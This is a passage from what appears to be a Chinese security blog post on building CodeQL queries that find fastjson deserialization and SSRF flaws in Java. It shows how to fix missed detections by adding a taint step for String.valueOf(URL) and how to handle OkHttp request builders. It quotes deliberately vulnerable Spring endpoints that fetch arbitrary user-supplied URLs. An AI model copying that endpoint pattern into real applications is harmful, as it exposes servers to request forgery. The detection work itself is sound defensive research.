&#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;fastjson&quot;</span> &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">        exists(Method method, MethodAccess call|</span><br><span class=\"line\">            method.hasName(<span class=\"string\">&quot;parseObject&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            call.getMethod() = method and</span><br><span class=\"line\">            sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)</span><br><span class=\"line\">            )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where fastjsonVul.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h1><p> RequestForgerySink 类。</p>\n<blockquote>\n<p>A data flow sink for server-side request forgery (SSRF) vulnerabilities.</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.RequestForgeryConfig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SSRFVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">\t\tSSRFVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;SSRFVulConfig&quot;</span> &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">    sink <span class=\"keyword\">instanceof</span> RequestForgerySink</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\"> where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\"> select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ssrf-漏报处理1\"><a href=\"#ssrf-漏报处理1\" class=\"headerlink\" title=\"ssrf 漏报处理1\"></a>ssrf 漏报处理1</h1><h2 id=\"漏报原因排查\"><a href=\"#漏报原因排查\" class=\"headerlink\" title=\"漏报原因排查\"></a>漏报原因排查</h2><p>但是其实ssrf 提供了5个路由都可以可以进行ssrf的，但是只排查出了3个。首先看看 two 这个路由 </p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(value = &quot;/two&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">Two</span><span class=\"params\">(<span class=\"meta\">@RequestParam(value = &quot;url&quot;)</span> String imageUrl)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(imageUrl);</span><br><span class=\"line\">        <span class=\"type\">HttpResponse</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> Request.Get(String.valueOf(url)).execute().returnResponse();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response.toString();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IOException var1) &#123;</span><br><span class=\"line\">        System.out.println(var1);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Hello&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>imageUrl→url = new URL(imageUrl)→String.valueOf(url)→Request.Get(String.valueOf(url))</code></p>\n<p>在 <code>two</code> 接口中的代码有问题的地方如下，用到了 <code>String.valueOf(url)</code>,正常情况下程序不会觉得 <code>String.valueOf()</code> 方法返回的仍然是污点。因此我们需要修改 Config 中的 <code>isAdditionalTaintStep</code> 方法，将 <code>java.net.URL</code> 和 <code>String.valueOf(url)</code> 绑定。</p>\n<p>我们这里直接跟进RequestForgeryConfig 这个类看一看。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010138565.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010138565.png\"  alt=\"image-20241130010138565\" lazyload></a></p>\n<p>注意这个isAdditionalTaintStep。继续跟进propagatesTaint谓语。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010703439.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010703439.png\"  alt=\"image-20241130010703439\" lazyload></a></p>\n<h2 id=\"处理方法1\"><a href=\"#处理方法1\" class=\"headerlink\" title=\"处理方法1\"></a>处理方法1</h2><p>我们这里直接修改 RequestForgery.qll  源码。主要是14到24行，还有 第 47 行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Provides classes to reason about server-side request forgery (SSRF) attacks. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.Networking</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.ApacheHttp</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.spring.Spring</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.JaxWS</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.javase.Http</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.frameworks.Properties</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">import</span> semmle.code.java.dataflow.StringPrefixes</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">class</span> <span class=\"title class_\">TypeStringLib</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RefType</span> &#123;</span><br><span class=\"line\">    TypeStringLib() &#123; <span class=\"built_in\">this</span>.hasQualifiedName(<span class=\"string\">&quot;java.lang&quot;</span>, <span class=\"string\">&quot;String&quot;</span>) &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">class</span> <span class=\"title class_\">StringValue</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">MethodAccess</span> &#123;</span><br><span class=\"line\">    StringValue()&#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.getCallee().getDeclaringType() <span class=\"keyword\">instanceof</span> TypeStringLib and</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.getCallee().hasName(<span class=\"string\">&quot;valueOf&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A unit class for adding additional taint steps that are specific to server-side request forgery (SSRF) attacks.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Extend this class to add additional taint steps to the SSRF query.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Unit</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * Holds if the step from `pred` to `succ` should be considered a taint</span></span><br><span class=\"line\"><span class=\"comment\">   * step for server-side request forgery.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">abstract</span> predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DefaultRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> &#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URI when its host is assigned to</span></span><br><span class=\"line\">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URL when its host is assigned to</span></span><br><span class=\"line\">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or </span><br><span class=\"line\">      <span class=\"comment\">//处理String.valueOf(URL)</span></span><br><span class=\"line\">    exists(StringValue c | c.getArgument(<span class=\"number\">0</span>) = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TypePropertiesRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    exists(MethodAccess ma |</span><br><span class=\"line\">      <span class=\"comment\">// Properties props = new Properties();</span></span><br><span class=\"line\">      <span class=\"comment\">// props.setProperty(&quot;jdbcUrl&quot;, tainted);</span></span><br><span class=\"line\">      <span class=\"comment\">// Propagate tainted value to the qualifier `props`</span></span><br><span class=\"line\">      ma.getMethod() <span class=\"keyword\">instanceof</span> PropertiesSetPropertyMethod and</span><br><span class=\"line\">      ma.getArgument(<span class=\"number\">0</span>).(CompileTimeConstantExpr).getStringValue() = <span class=\"string\">&quot;jdbcUrl&quot;</span> and</span><br><span class=\"line\">      pred.asExpr() = ma.getArgument(<span class=\"number\">1</span>) and</span><br><span class=\"line\">      succ.asExpr() = ma.getQualifier()</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RequestForgerySink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DataFlow</span>::Node &#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DefaultRequestForgerySink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgerySink</span> &#123;</span><br><span class=\"line\">  DefaultRequestForgerySink() &#123; sinkNode(<span class=\"built_in\">this</span>, <span class=\"string\">&quot;request-forgery&quot;</span>) &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** A sanitizer for request forgery vulnerabilities. */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RequestForgerySanitizer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DataFlow</span>::Node &#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PrimitiveSanitizer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgerySanitizer</span> &#123;</span><br><span class=\"line\">  PrimitiveSanitizer() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getType() <span class=\"keyword\">instanceof</span> PrimitiveType or</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getType() <span class=\"keyword\">instanceof</span> BoxedType or</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getType() <span class=\"keyword\">instanceof</span> NumberType</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HostnameSanitizingPrefix</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">InterestingPrefix</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> offset;</span><br><span class=\"line\"></span><br><span class=\"line\">  HostnameSanitizingPrefix() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Matches strings that look like when prepended to untrusted input, they will restrict</span></span><br><span class=\"line\">    <span class=\"comment\">// the host or entity addressed: for example, anything containing `?` or `#`, or a slash that</span></span><br><span class=\"line\">    <span class=\"comment\">// doesn&#x27;t appear to be a protocol specifier (e.g. `http://` is not sanitizing), or specifically</span></span><br><span class=\"line\">    <span class=\"comment\">// the string &quot;/&quot;.</span></span><br><span class=\"line\">    exists(<span class=\"built_in\">this</span>.getStringValue().regexpFind(<span class=\"string\">&quot;([?#]|[^?#:/\\\\\\\\][/\\\\\\\\])|^/$&quot;</span>, <span class=\"number\">0</span>, offset))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override <span class=\"type\">int</span> <span class=\"title function_\">getOffset</span><span class=\"params\">()</span> &#123; result = offset &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A value that is the result of prepending a string that prevents any value from controlling the</span></span><br><span class=\"line\"><span class=\"comment\"> * host of a URL.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HostnameSantizer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgerySanitizer</span> &#123;</span><br><span class=\"line\">  HostnameSantizer() &#123; <span class=\"built_in\">this</span>.asExpr() = any(HostnameSanitizingPrefix hsp).getAnAppendedExpression() &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"处理方法2\"><a href=\"#处理方法2\" class=\"headerlink\" title=\"处理方法2\"></a>处理方法2</h2><p>或者不改写lib，直接改写 ql 查询语句。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.RequestForgeryConfig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TypeStringLib</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RefType</span> &#123;</span><br><span class=\"line\">  TypeStringLib() &#123; <span class=\"built_in\">this</span>.hasQualifiedName(<span class=\"string\">&quot;java.lang&quot;</span>, <span class=\"string\">&quot;String&quot;</span>) &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">StringValue</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">MethodAccess</span> &#123;</span><br><span class=\"line\">  StringValue()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().getDeclaringType() <span class=\"keyword\">instanceof</span> TypeStringLib and</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().hasName(<span class=\"string\">&quot;valueOf&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> &#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URI when its host is assigned to</span></span><br><span class=\"line\">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URL when its host is assigned to</span></span><br><span class=\"line\">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or </span><br><span class=\"line\">    <span class=\"comment\">//处理String.valueOf(URL)</span></span><br><span class=\"line\">    exists(StringValue c | c.getArgument(<span class=\"number\">0</span>) = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SSRFVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">  SSRFVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;first_modifySSRF&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node source)</span> &#123;</span><br><span class=\"line\">      source <span class=\"keyword\">instanceof</span> RemoteFlowSource and</span><br><span class=\"line\">      <span class=\"comment\">// Exclude results of remote HTTP requests: fetching something else based on that result</span></span><br><span class=\"line\">      <span class=\"comment\">// is no worse than following a redirect returned by the remote server, and typically</span></span><br><span class=\"line\">      <span class=\"comment\">// we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span></span><br><span class=\"line\">      not source.asExpr().(MethodAccess).getCallee() <span class=\"keyword\">instanceof</span> UrlConnectionGetInputStreamMethod</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">      sink <span class=\"keyword\">instanceof</span> RequestForgerySink</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isAdditionalTaintStep</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ssrf-漏报处理2\"><a href=\"#ssrf-漏报处理2\" class=\"headerlink\" title=\"ssrf 漏报处理2\"></a>ssrf 漏报处理2</h1><p>还有一个漏的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(value = &quot;/three&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">Three</span><span class=\"params\">(<span class=\"meta\">@RequestParam(value = &quot;url&quot;)</span> String imageUrl)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(imageUrl);</span><br><span class=\"line\">        <span class=\"type\">OkHttpClient</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>();</span><br><span class=\"line\">        com.squareup.okhttp.<span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">com</span>.squareup.okhttp.Request.Builder().get().url(url).build();</span><br><span class=\"line\">        <span class=\"type\">Call</span> <span class=\"variable\">call</span> <span class=\"operator\">=</span> client.newCall(request);</span><br><span class=\"line\">        <span class=\"type\">Response</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> call.execute();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response.toString();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IOException var1) &#123;</span><br><span class=\"line\">        System.out.println(var1);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Hello&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>com.squareup.okhttp.Request request &#x3D; new com.squareup.okhttp.Request.Builder().get().url(url).build();</p>\n<p>这种请求相对更复杂，因此需要自行构造规则。在这一条 ql 的语句当中有两个关键的定位锚点，一个是<code>url(url)</code>，一个是 <code>build()</code>，<code>url()</code> 确定是否引入污点，<code>build()</code> 确定sink的位置。结合这两者，进行检测 ql 的构造。先看一下这个的语法树AST。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130014216314.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130014216314.png\"  alt=\"image-20241130014216314\" lazyload></a></p>\n<p>这种链式结构调用在语法树中是包含的关系，当获取到最外层的 MethodAccess 时，可以使用 <code>getAChildExpr()</code> 方法返回其子语句，使用 <code>getAChildExpr+()</code> 可以递归返回全部子语句。结合前面说到的两个关键定位锚点，进行如下代码构造</p>\n<p>最终。效果。7-20 行 ，56 行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 